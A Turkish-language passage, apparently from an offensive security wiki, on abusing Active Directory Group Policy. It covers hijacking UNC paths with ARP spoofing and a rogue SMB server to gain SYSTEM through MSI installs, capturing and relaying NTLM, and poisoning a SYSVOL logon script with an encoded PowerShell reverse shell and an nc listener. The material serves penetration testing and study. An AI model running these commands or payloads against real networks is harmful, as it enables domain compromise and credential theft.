  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Bağlantılı GPO, bir MSI'ı UNC yolundan dağıtıyorsa istemci bu dosyayı **bilgisayar başlangıcında** alır ve **`NT AUTHORITY\SYSTEM`** olarak yükler. Başvurulan host'u taklit edip aynı paylaşım/yol/ad altında kötü amaçlı bir MSI sunarak **SYSVOL'u değiştirmeden** `WriteGPLink` üzerinden SYSTEM kod yürütme elde edebilirsiniz.

Önemli kısıtlamalar:

- **Zamanlama önemlidir**: Yeni bağlantı politika yenilemesinde (genellikle ~90 dakika) görünür, ancak **Software Installation** genellikle **yeniden başlatma** sırasında tetiklenir.
- Windows Installer dağıtımı genellikle paketin **`ProductCode`** değeriyle takip eder. Ürün zaten yüklüyse dağıtım atlanabilir.
- Yükleyicinin paketi reddetmesini önlemek için, rogue MSI'ı yamalayarak **`ProductCode`** ve **`PackageCode`** değerlerini GPO'nun beklediği meşru paketin değerleriyle eşleştirin.
- Eski `.aas` duyuru dosyaları `SYSVOL` içinde kalabilir; bu yönteme güvenmeden önce dağıtımın hâlâ etkin göründüğünü doğrulayın.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` içindeki GPP sürücü eşlemeleri, oturum açma veya yeniden bağlanma sırasında kullanıcıların yapılandırılmış UNC yoluna kimlik doğrulaması yapmasına neden olur. Referans verilen host’u taklit ederseniz **NetNTLMv2** yakalayabilirsiniz. SMB’nin kasıtlı olarak başarısız olmasını sağlarsanız Windows, **WebDAV** üzerinden yeniden deneyebilir ve **HTTP üzerinden NTLM** gönderebilir. Bu da **LDAP(S)**, **AD CS** veya **SMB**’ye relay yapmak için çok daha fazla esneklik sağlar.

#### Logon/startup script UNC hijack

Aynı yöntem, `SYSVOL` içinde bulunan UNC üzerinden barındırılan script’ler için de geçerlidir:

- **Logon scripts** genellikle **user** bağlamında çalışır.
- **Startup scripts** genellikle **computer / SYSTEM** bağlamında çalışır.

Script yolu taklit edilebilir bir hostname’e işaret ediyorsa UNC host’unu yönlendirin ve beklenen konumdan değiştirilmiş script içeriği sunun.

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` veya `\\<dc>\NETLOGON\` altındaki yazılabilir yollar, GPO aracılığıyla kullanıcılar oturum açarken çalıştırılan logon script’lerinin değiştirilmesine olanak tanır. Bu, oturum açan kullanıcıların güvenlik bağlamında kod çalıştırılmasını sağlar.

### Logon script’lerini bulma
- Yapılandırılmış bir logon script’i olup olmadığını görmek için kullanıcı özniteliklerini inceleyin:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Komut dosyalarına yönelik kısayolları veya referansları ortaya çıkarmak için domain paylaşımlarını tarayın:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- SYSVOL/NETLOGON içindeki hedefleri çözümlemek için `.lnk` dosyalarını ayrıştırın (yararlı bir DFIR hilesi ve doğrudan GPO erişimi olmayan saldırganlar için):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound, mevcut olduğunda kullanıcı nesnesinin `scriptPath` oturum açma betiği özniteliğini görüntüler. GPO ile yapılandırılan oturum açma betikleri ayrı bir ilke başvurusudur; bu nedenle ilgili GPO'yu da inceleyin.

### Yazma erişimini doğrulayın (paylaşım listelerine güvenmeyin)
Otomatik araçlar, ilgili betiğin NTFS ACL'si farklı olsa bile SYSVOL/NETLOGON'u salt okunur olarak gösterebilir. Önce dosyayı ve üst dizinini salt okunur olarak inceleyin; eşleşen Allow ACE'ler aday olmaya devam eder, çünkü etkin SMB ve NTFS erişimi, Deny ACE'ler ve mevcut token'ın tümü önemlidir:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Yetkili bir yazma testi hedefe özel ve geri alınabilir olmalıdır; özgün betek yedeklenip geri yüklenmelidir. Erişimi test etmek için çalışan bir oturum açma betiğinin üzerine yazmayın; başarılı bir yazma, sonraki kullanıcının oturum açışında çalışabilir.

### RCE için VBScript oturum açma betiğini zehirleme
İşlevselliği bozmamak için özgün mantığı koruyarak PowerShell reverse shell başlatan bir komut ekleyin (revshells.com'dan oluşturun):

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Hostunuzda dinleyin ve sonraki etkileşimli oturum açma işlemini bekleyin:

```bash
rlwrap -cAr nc -lnvp 443
```

Notlar:
- Yürütme, SYSTEM değil, logging kullanıcısının token’ı altında gerçekleşir. Kapsam, bu script’i uygulayan GPO bağlantısıdır (OU, site, domain).
- Kullanımdan sonra özgün içeriği/zaman damgalarını geri yükleyerek temizleyin.


## References

- [1] [Active Directory ACL/ACE’lerini kötüye kullanma](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Ayrıcalıklı Hesaplar ve Token Ayrıcalıkları](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Saldırı Yolu Güncellemesi](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory’de ACL’lerle ayrıcalık yükseltme](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Ayrıcalıklarını ve Ayrıcalıklı Hesapları Tarama](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Oluşturucusu - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux’tan AD öznitelik/UAC işlemleri](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (grup üyeliği)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL’lerini kötüye kullanma, KeePassXC Argon2 kırma ve DC admin’e ulaşmak için DPAPI şifre çözme](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP ile dolaş, sonucu gör: Kod yürütme ve NTLM relay için GPO UNC yollarını ele geçirme](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relay ve daha fazlası üzerinden Active Directory GPO’larını kötüye kullanma](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU şakası mı? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory’de gizli Organizational Unit ACL saldırı vektörlerini kötüye kullanma](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Ağda meşru Active Directory hizmetlerini taklit etme: GPO’nun kötüye kullanılması örneği](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU’lar arasında ilerleme ve devralınan ACL’leri kötüye kullanma](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
